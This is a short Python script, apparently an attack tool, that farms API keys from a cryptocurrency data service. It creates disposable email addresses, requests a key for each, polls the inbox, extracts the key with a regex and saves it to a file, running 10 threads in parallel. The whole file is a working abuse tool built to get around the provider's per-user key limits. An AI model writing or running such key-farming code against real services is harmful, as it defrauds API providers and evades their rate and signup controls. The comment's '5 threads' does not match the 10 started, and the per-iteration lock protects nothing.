from bypass_tempmailAPI import TMail, TMailAccount
from bypass_cryptoAPI import CryptoAPI
import time
import re
import threading

def getKey(message:dict):
    if "CoinAPI" in message["subject"]:
        # get the key
        result = re.search("(?<=API Key: )(\w+.\w+.\w+.\w+.\w+)", message["body"])
        if result != None:
            print("[+] Found Key: ", result.group(0))
            return result.group(0)

def attack(count):
    for i in range(count):
        # first we need an email acount
        provider = TMail()
        api = CryptoAPI()
        accounts = provider.GetRandomMail()
        for a in accounts:
            print("[+] Requesting key with: ", a.address)
            api.RequestKey(a.address)

            inbox = provider.GetMailBox(a)
            while(len(inbox) == 0):
                time.sleep(1)
                inbox = provider.GetMailBox(a)
            
            for message in inbox:
                msg = provider.ReadMessage(a, message)
                key = getKey(msg)

                l = threading.Lock()
                l.acquire()
                with open("new-keys.txt", "a") as keys:
                    keys.write(key + "\n")
                l.release()

def main():
    # staring 5 threads
    threads = []
    for i in range(10):
        t = threading.Thread(target=attack, args=(20, ), daemon=False)
        t.start()
        threads.append(t)

if __name__ == "__main__":
    main()